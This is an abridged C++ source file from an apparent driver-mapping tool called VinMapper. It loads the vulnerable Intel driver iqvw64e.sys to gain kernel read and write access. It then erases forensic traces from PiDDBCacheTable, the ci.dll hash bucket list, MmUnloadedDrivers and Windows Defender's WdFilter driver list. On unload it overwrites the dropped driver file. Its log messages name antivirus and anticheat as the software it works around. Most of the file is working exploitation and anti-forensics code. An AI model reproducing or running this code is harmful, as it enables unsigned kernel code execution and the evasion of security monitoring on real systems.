...
std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = VinUtils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
...
NTSTATUS intel_driver::AcquireDebugPrivilege() {
	...
	if (!NT_SUCCESS(Status)) {
		VinLog("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
	}
	return Status;
}
...
NTSTATUS intel_driver::Load() {
	...
	//from https://github.com/ShoaShekelbergstein/VinMapper as some Drivers takes same device name
	if (intel_driver::IsRunning()) {
		VinLog(L"[-] \\Device\\Nal is already in use." << std::endl);
		VinLog(L"[-] This means that there is a intel driver already loaded or another instance of VinMapper is running or VinMapper crashed and didn't unload the previous driver." << std::endl);
		VinLog(L"[-] If you are sure that there is no other instance of VinMapper running, you can try to restart your computer to fix this issue." << std::endl);
		VinLog(L"[-] If the problem persists, you can try to unload the intel driver manually (If the driver was loaded with VinMapper will have a random name and will be located in %temp%), if not, the driver name is iqvw64e.sys." << std::endl);
		return STATUS_ALREADY_REGISTERED;
	}

	VinLog(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		VinLog(L"[-] Can't find TEMP folder" << std::endl);
		return STATUS_UNSUCCESSFUL;
	}

	_wremove(driver_path.c_str());

	if (!VinUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		VinLog(L"[-] Failed to create vulnerable driver file" << std::endl);
		return STATUS_DISK_OPERATION_FAILED;
	}

	auto status = AcquireDebugPrivilege();
	if (!NT_SUCCESS(status)) {
		VinLog(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
		_wremove(driver_path.c_str());
		return status;
	}
	...
	if (!NT_SUCCESS(status)) {
		VinLog(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return status;
	}
	...
	{
		VinLog(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		intel_driver::Unload();
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = VinUtils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		VinLog(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload();
	...
	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		VinLog(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		intel_driver::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	if (!intel_driver::ClearPiDDBCacheTable()) {
		VinLog(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload();
	...
	if (!intel_driver::ClearKernelHashBucketList()) {
		VinLog(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload();
		return STATUS_DELETE_PENDING | 0x2000;
	}

	if (!intel_driver::ClearMmUnloadedDrivers()) {
		VinLog(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		intel_driver::Unload();
		return STATUS_DELETE_PENDING | 0x3000;
	}

	if (!intel_driver::ClearWdFilterDriverList()) {
		VinLog("[!] Failed to ClearWdFilterDriverList" << std::endl);
		intel_driver::Unload();
...
bool intel_driver::ClearWdFilterDriverList() {
	...
	auto WdFilter = VinUtils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		VinLog("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}
	...
	if (!MpBmDocOpenRules)
	{
		VinLog("[-] Failed To Get MpBmDocOpenRules." << std::endl);
		return false;
	}
	...
	{
		VinLog("[-] Failed To Get MpFreeDriverInfoEx." << std::endl);
		return false;
	}
	...
	if (!RuntimeDriversList) {
		VinLog("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}
	...
	if (!RuntimeDriversCountRef) {
		VinLog("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}
	...
	*/
	...
	if (!MpFreeDriverInfoExRef) {
		...
		*/
		...
		if (!MpFreeDriverInfoExRef) {
			VinLog("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			VinLog("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}
			...
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
					...
					if (!removedRuntimeDriversArray) {
						VinLog("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}
					...
					if (Magic != 0xDA18) {
						VinLog("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					VinLog("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
...
NTSTATUS intel_driver::Unload() {
	VinLog(L"[<] Unloading vulnerable driver" << std::endl);
	...
	if (!file_ofstream.is_open()) {
		VinLog(L"[!] Error opening driver file to dump random data inside the disk" << std::endl);
	...
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		VinLog(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		VinLog(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	...
	if (!GetPhysicalAddress(address, &physical_address)) {
		VinLog(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}
	...
	if (!mapped_physical_memory) {
		VinLog(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}
	...
	if (!UnmapIoSpace(mapped_physical_memory, size))
		VinLog(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif
...
uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
{
	...
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		...
		if (!kernel_MmAllocateIndependentPagesEx) {
			VinLog(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
...
bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	...
	if (!kernel_MmFreeIndependentPages)
	{
		...
		if (!kernel_MmFreeIndependentPages) {
			VinLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
		...
		if (!kernel_MmFreeIndependentPages) {
			...
			VinLog(L"[+] Trying second pattern for MmFreeIndependentPages" << std::endl);
...
BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		VinLog(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}
	...
	if (!kernel_MmSetPageProtection)
	{
		...
		if (!kernel_MmSetPageProtection) {
			VinLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
...
uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	...
	if (!kernel_ExAllocatePool) {
		VinLog(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}
...
bool intel_driver::ClearMmUnloadedDrivers() {
	...
	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		VinLog(L"[!] Failed to find device_object" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		VinLog(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		VinLog(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		VinLog(L"[!] Failed to find driver name" << std::endl);
		return false;
	}
	...
	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		VinLog(L"[!] Failed to read driver name" << std::endl);
		return false;
	}
	...
	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		VinLog(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	VinLog(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}
...
bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	...
	if (!kernel_ExAcquireResourceExclusiveLite) {
		VinLog(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}
...
bool intel_driver::ExReleaseResourceLite(PVOID Resource) {
	...
	if (!kernel_ExReleaseResourceLite) {
		VinLog(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}
...
BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		VinLog(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}
...
PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		VinLog(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}
...
bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
	...
	if (!PiDDBLockOffset)
	{
		VinLog(L"[-] Warning PiDDBLock not found" << std::endl);
		return false;
	}
	...
	{
		VinLog(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}
	...
	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as possible
		...
		if (PiDDBLockPtr == NULL) {
			...
			if (PiDDBLockPtr == NULL) {
				...
				VinLog(L"[+] PiDDBLock found with third pattern" << std::endl);
				PiDDBLockPtr += 19;//third pattern offset
			}
		}
		else {
			VinLog(L"[+] PiDDBLock found with second pattern" << std::endl);
	...
	if (PiDDBCacheTablePtr == NULL) {
		...
		if (PiDDBCacheTablePtr == NULL) {
			...
			VinLog(L"[+] PiDDBCacheTable found with second pattern" << std::endl);
			PiDDBCacheTablePtr += 2;//second pattern offset
		}
	}

	VinLog("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	VinLog("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);
	...
	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true)) {
		VinLog(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	VinLog(L"[+] PiDDBLock Locked" << std::endl);
	...
	if (pFoundEntry == nullptr) {
		VinLog(L"[-] Not found in cache" << std::endl);
	...
	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		VinLog(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	...
	VinLog(L"[+] PiDDBCacheTable Cleaned" << std::endl);
...
uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		VinLog(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		VinLog(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen)) {
		VinLog(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = VinUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
...
uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	...
	if (!ReadMemory(modulePtr, headers, 0x1000)) {
		VinLog(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)VinUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		VinLog(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
...
bool intel_driver::ClearKernelHashBucketList() {
	uint64_t ci = VinUtils::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		VinLog(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}
	...
	{
		VinLog(L"[-] Can't Find g_KernelHashBucketList Offset" << std::endl);
		return false;
	}
	...
	if (!g_KernelHashBucketListOffset)
	{
		VinLog(L"[-] Can't Find g_HashCacheLock Offset" << std::endl);
		return false;
	}
	...
	if (!sig) {
		VinLog(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		VinLog(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	...
	{
		VinLog(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}
#endif

	VinLog(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) {
		VinLog(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	VinLog(L"[+] g_HashCacheLock Locked" << std::endl);
	...
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(entry))) {
		VinLog(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		VinLog(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	...
	while (entry) {
		...
		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			VinLog(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		...
		if (expected_len == wsNameLen) {
			...
			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				VinLog(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			...
			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				VinLog(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			...
			if (find_result != std::wstring::npos) {
				VinLog(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				nt::HashBucketEntry* Next = 0;
				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(Next))) {
					VinLog(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				...
				if (!WriteMemory((uintptr_t)prev, &Next, sizeof(Next))) {
					VinLog(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				...
				if (!FreePool((uintptr_t)entry)) {
					VinLog(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(g_HashCacheLock)) {
						VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				VinLog(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(g_HashCacheLock)) {
					VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					return false;
				}
		...
		if (!ReadMemory((uintptr_t)entry, &entry, sizeof(entry))) {
			VinLog(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(g_HashCacheLock)) {
				VinLog(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
